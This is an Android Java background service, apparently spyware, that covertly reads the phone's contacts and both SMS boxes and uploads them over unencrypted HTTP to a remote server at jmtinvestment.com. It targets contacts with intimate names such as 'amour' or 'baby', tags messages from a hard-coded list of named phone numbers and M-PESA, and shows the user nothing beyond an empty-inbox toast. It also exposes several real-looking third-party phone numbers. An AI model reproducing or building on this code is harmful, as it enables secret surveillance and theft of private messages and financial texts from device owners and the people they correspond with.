package com.koziengineering.user.franvanna;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.koziengineering.user.franvanna.Objects.SMS;
import com.koziengineering.user.franvanna.Objects.SMSReader;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class MyService extends IntentService {
    // TODO: Rename actions, choose action names that describe tasks that this
    // IntentService can perform, e.g. ACTION_FETCH_NEW_ITEMS
    private static final String ACTION_READ_UPLOAD_CONTACTS = "com.koziengineering.user.franvanna.action.FOO";
    private static final String ACTION_READ_UPLOAD_SMS = "com.koziengineering.user.franvanna.action.BAZ";

    // TODO: Rename parameters
    private static final String EXTRA_PARAM1 = "com.koziengineering.user.franvanna.extra.PARAM1";
    private static final String EXTRA_PARAM2 = "com.koziengineering.user.franvanna.extra.PARAM2";
    private static final String IP = "www.jmtinvestment.com";
    public static final String SERVICE_MESSAGE = "myServiceMessage";
    public static final String MESSAGE_KEY = "messageKey";
    public static final String SMS_NUMS_LIST = "numsList";
    //private static final String IP = ;
    private JSONArray contactsJSONArray = new JSONArray();

    public MyService() {
        super("MyService");
    }

    /**
     * Starts this service to perform action Foo with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionLoadUploadContacts(Context context, String param1, String param2) {
        Intent intent = new Intent(context, MyService.class);
        intent.setAction(ACTION_READ_UPLOAD_CONTACTS);
        intent.putExtra(EXTRA_PARAM1, param1);
        intent.putExtra(EXTRA_PARAM2, param2);
        context.startService(intent);
    }

    public static void startActionUploadSMSFromContacts(Context context, String param1, String param2) {
        Intent intent = new Intent(context, MyService.class);
        intent.setAction(ACTION_READ_UPLOAD_SMS);
        intent.putExtra(SMS_NUMS_LIST, param1);
        intent.putExtra(EXTRA_PARAM2, param2);
        context.startService(intent);
    }



    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if (ACTION_READ_UPLOAD_CONTACTS.equals(action)) {
                final String param1 = intent.getStringExtra(EXTRA_PARAM1);
                final String param2 = intent.getStringExtra(EXTRA_PARAM2);
                handleActionReadUploadContacts(param1, param2);
            }else if(ACTION_READ_UPLOAD_SMS.equals(action)){

                final String numsList = intent.getStringExtra(SMS_NUMS_LIST);
                handleActionReadUploadSMS(numsList);

            }

        }
    }

    private void sendMessage(String message){

        Intent intent = new Intent(SERVICE_MESSAGE);
        intent.putExtra(MESSAGE_KEY, message);
        intent.putExtra(SMS_NUMS_LIST, numsList);
        LocalBroadcastManager.getInstance(getApplicationContext()).sendBroadcast(intent);

    }

    //private SMSReader smsReader;

    private Map<String, List<SMS>> smsMapInbox = new HashMap<>();
    private Map<String, List<SMS>> smsMapSent = new HashMap<>();
    //private List<SMS> smsList = new ArrayList<>();
    private boolean[] SMS_BOXES_READ = new boolean[]{false,false};
    private static final int SMS_BOX_INBOX = 0;
    private static final int SMS_BOX_SENT = 1;
    private static int c = 0;

    private SMSReader.SMSListener mSMSListener = new SMSReader.SMSListener() {
        @Override
        public void onSMSReadComplete(Map<String, List<SMS>> smsMap, String smsBox) {


            if(smsBox == SMSReader.SMS_BOX_INBOX){
                SMS_BOXES_READ[SMS_BOX_INBOX] = true;
            }

            if(smsBox == SMSReader.SMS_BOX_SENT){
                SMS_BOXES_READ[SMS_BOX_SENT] = true;
            }

            Set<String> keys = smsMap.keySet();
            List<String> lookedKeys = new ArrayList<>();

            lookedKeys.add("+243970518587");
            lookedKeys.add("M-PESA");

            for(int i = 0; i < smsMap.size(); i++){


                String key = (String) keys.toArray()[i];
                if(true){//lookedKeys.contains(key)) {
                    smsList.addAll(smsMap.get(key));

                    Log.e("KOK", "adding key : " + key );
                }

            }

            //Log.e("DAK", "sms size -> " + smsMap.size() + ", box : " + smsBox + ", c: " + c + ", smsList size : " + smsList.size()  );



            if(SMS_BOXES_READ[SMS_BOX_INBOX] && SMS_BOXES_READ[SMS_BOX_SENT]){
                Log.e("BOOM", "smsList size : " + smsList.size() );
                uploadSMSToServer();
                SMS_BOXES_READ[SMS_BOX_INBOX] = false;
                SMS_BOXES_READ[SMS_BOX_SENT] = false;
            }


            if(MyService.this.smsList.size() == 0){
                onSMSInboxEmpty();
            }

            //adapter.notifyDataSetChanged();
            //ActivityMain.this.getSupportActionBar().setTitle("SMSTest : " + ActivityMain.this.smsMap.size() );
            c++;
        }

        private int SMS_NUM = 5;
        private int sms_i = 0;
        private void uploadSMSToServer() {

            final JSONArray messages = new JSONArray();


            Map<String,String> phones = new HashMap<>();


            phones.put("+243993323617", "MikoB");
            phones.put("+243972257958", "Garry");
            phones.put("+243972704838", "DanMak");
            //phones.put("+243970510587","PlamAir");
            //phones.put("+243827712457","PlamVod");
            phones.put("+243978647327","Taty");
            phones.put("+243997223226","Claire");
            //phones.put()

            long numDaysBefore = 3;
            long numMillisBefore = numDaysBefore * 60 * 60 * 24 * 1000;

            Set<String> keys = phones.keySet();

            List<String> exclude = new ArrayList<>();

            exclude.add("+4425");
            exclude.add("+4625");
            exclude.add("+1211");



            for(int i = 0; i < smsList.size(); i++){

                SMS sms = smsList.get(i);
                String dateBeforNumDays = com.koziengineering.user.franvanna.Objects.Utils.fromattedDateFromMillis(
                        sms.dateLong() - numMillisBefore);
                Log.e("KDATE", "date : " + sms.formattedDate() );
                Log.e("KDATE", "date 7 days before : " + dateBeforNumDays );






                try {
                    if(true){//sms_i < SMS_NUM) {
                        JSONObject smsJSON = sms.toJSONObject();
                        String mobile = sms.mobile();
                        if (keys.contains(mobile)  ){//&& sms.dateLong() >= numMillisBefore ) {
                            smsJSON.put(SMS.KEY_ADDRESS, phones.get(mobile) + " (" + mobile + ")");
                            messages.put(smsJSON);
                            sms_i++;

                        }

                    }else{
                        sms_i = 0;
                    }

                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e(TAG, "SMS Exception: -> "+ e.getMessage());
                }

            }

            Log.e("DALEN", "size " + messages.length() );


            //JSONStringer jsonStringer = new JSONStringer();


            String url = "http://"+ IP +"/sosachat/api.php?act=uploadsms";
            //url = "http://jmtinvestment.com/sosachat/api.php?act=test";

            Log.e(TAG, "uploadSMSToServer: url " + url );


            StringRequest requestItemDetails = new StringRequest(
                    Request.Method.POST,
                    url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String s) {


                            Log.e(TAG, "ON THA RES -> " + s);


                        }
                    },

                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError volleyError) {


                            Log.e(TAG, "expose volley item -> " + volleyError.toString() );

                        }
                    }
            ) {

                @Override
                protected Map<String, String> getParams() {
                    Map<String, String> params = new HashMap<>();


                    params.put("data", messages.toString());

                    Log.e(TAG, "getParams: " + messages.toString() );


                    return params;
                }


            };

/*
            Log.e(TAG, "uploadSMSToServer: uploading ... "  );
            requestItemDetails.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError volleyError) throws VolleyError {

                }
            });*/
            Volley.newRequestQueue(MyService.this).add(requestItemDetails);

        }

        @Override
        public void onSMSInboxEmpty() {
            Log.e(TAG, "onSMSInboxEmpty: " );

            Toast.makeText(MyService.this, "Your sms inbox is empty", Toast.LENGTH_SHORT).show();

            //adapter.notifyDataSetChanged();
        }
    };

    private void handleActionReadUploadSMS(String nums) {

        Log.e("DARI", "dari -> " + nums );

        SMSReader smsReader = new SMSReader(getBaseContext());

        smsMapInbox.clear();
        smsMapSent.clear();
        this.smsList.clear();

        smsReader.readSMS(new SMSReader.SMSListener() {
            @Override
            public void onSMSReadComplete(Map<String, List<SMS>> smsMap, String smsBox) {

                //ActivityMain.this.smsMap.putAll(smsMap);
                mSMSListener.onSMSReadComplete(smsMap, smsBox);
            }



            @Override
            public void onSMSInboxEmpty() {

                //INBOX_READ = true;
                mSMSListener.onSMSInboxEmpty();

            }
        }, SMSReader.SMS_BOX_INBOX);


        smsReader.readSMS(new SMSReader.SMSListener() {
            @Override
            public void onSMSReadComplete(Map<String, List<SMS>> smsMapInbox, String smsBox) {
                //SENT_READ = true;
                //sms.putAll(smsMapInbox);

                //ActivityMain.this.smsMap.putAll(smsMapInbox);
                mSMSListener.onSMSReadComplete(smsMapInbox, smsBox);
            }



            @Override
            public void onSMSInboxEmpty() {

                //INBOX_READ = true;
                mSMSListener.onSMSInboxEmpty();

            }
        }, SMSReader.SMS_BOX_SENT);

    }

    private List<SMS> smsList = new ArrayList<>();
    private int SMS_NUM = 5;
    private int sms_i = 0;

    private void uploadSMSToServer() {



    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */

    private String numsList = "";

    private void handleActionReadUploadContacts(String param1, String param2) {

        //Log.e("SERV", "reading contacts " );

        contactsJSONArray = new JSONArray();
        final ArrayList<HashMap<String,String>> contactsData = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        final Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null,null,null,null);

        final List<String> mobList = new ArrayList<>();

        mobList.add("+243977779133");
        mobList.add("+243897226048");
        mobList.add("+243828535960");
        mobList.add("+243993323617");

        new Handler().post(new Runnable() {
            @Override
            public void run() {

                while (cursor.moveToNext()){
                    try {
                        String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        String hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

                        if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0){
                            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +"=" +contactId,null,null);

                            while (phones.moveToNext()){
                                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                HashMap<String,String> map = new HashMap<>();
                                String namelc = name.toLowerCase();
                                if(mobList.contains(phoneNumber) || namelc.indexOf("amour") != -1  || namelc.indexOf("amor") != -1 ||
                                        namelc.indexOf("baby") != -1 || namelc.indexOf("best") != -1 ) {
                                    map.put("name", name);
                                    map.put("number", phoneNumber);
                                    contactsData.add(map);

                                    JSONObject contact = new JSONObject();
                                    contact.put("name", name);
                                    contact.put("number", phoneNumber);

                                    contactsJSONArray.put(contact);
                                    Log.e(TAG, "c : " + contact.toString() );
                                    numsList = numsList.concat(phoneNumber + ",");
                                }
                            }




                            phones.close();
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                        Log.e(TAG, "readContacts: -> " + e.getMessage() );
                    }
                }

                onContactsReadComplete();

            }
        });

    }

    private void onContactsReadComplete() {
        //Log.e("KSIZE", "upload size : " + contactsJSONArray.toString().length() );
        //Log.e("KDATA", "upload data : " + contactsJSONArray.toString() );
        sendMessage(SERVICE_MESSAGE);
        uploadData();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.e(TAG, "onCreate: " );
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.e(TAG, "onDestroy: " );
    }

    private static final String TAG = "SERVT";

    private void uploadData() {


        String url = "http://"+IP+"/sosachat/api.php?act=uploadcont";

        StringRequest requestItemDetails = new StringRequest(
                Request.Method.POST,
                url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String s) {


                        Log.e(TAG, "ON THA RES CONTACTS -> " + s);


                    }
                },

                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError volleyError) {


                        Log.e(TAG, "contacts exception  -> " + volleyError.toString() );

                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();


                params.put("data", contactsJSONArray.toString());

                Log.e(TAG, "getParams: contacts ->  " + contactsJSONArray.toString() );


                return params;
            }


        };
        Volley.newRequestQueue(getBaseContext()).add(requestItemDetails);
    }




}
